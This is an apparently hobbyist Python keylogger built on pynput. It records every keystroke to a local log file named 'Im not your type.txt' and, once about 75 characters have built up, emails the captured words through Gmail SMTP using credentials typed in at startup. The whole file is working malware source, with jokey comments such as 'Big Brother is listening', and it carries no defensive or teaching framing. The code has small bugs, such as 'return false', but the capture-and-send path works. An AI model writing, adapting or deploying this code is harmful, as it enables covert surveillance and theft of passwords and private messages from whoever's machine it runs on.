import datetime
import logging
import smtplib

from pynput.keyboard import Key, Listener
em = input('What is your email?\n')
pw = input('What is the Password?\n')
print('Sign in successful, Big Brother is listening.')
email = f'{em}'  ###Setting up out test email variables. obvious names for values
password = f'{pw}'
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)  ###Connect to gmail on port 465
server.login(email, password)  ###Login to the server using these credentials
log = ""  ###Setting variables
word = ""  ###Setting variables
email_char_limit = 75  ###Character limit before sending email


def send_log():  ###Function because lazy. Sends enauk
    server.sendmail(email, email, log)
    ###Server, send email to email variable from email variable containing log


log_directory = r'Im not your type'
logging.basicConfig(filename=(log_directory + '.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')


###Setting up log file basics. filename is going to be "Im not your type.txt" and the keystrokes will be saved with the time they were pressed

def on_press(key):
    global word, log, email, character_limit  ###Let our function modify these variables
    logging.info(str(key))  ###Save key
    if key == Key.space or key == Key.enter:
        word += ' '
        log += word
        word = ''  ###If the user presses space or enter, add a space. Add the space to the word and then add it to the log. Word resets
        if len(log) >= email_char_limit:
            send_log()
            log = ''  ###If the log gets the 75 char limit send my log and reset it
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]  ###Removes the last letter from word variable
    else:
        char = f'{key}'
        char = char[1:-1]  ###character is whatever we pressed in the line above
        word += char  ###Word is put together until someone hits space or enter
    if key == Key.esc:
        return false  ###Nothing happens


with Listener(on_press=on_press) as BIG_BROTHER:
    BIG_BROTHER.join()  ###Whenever Listener hears a keystroke Big_Brother will join the main thread and record the results.
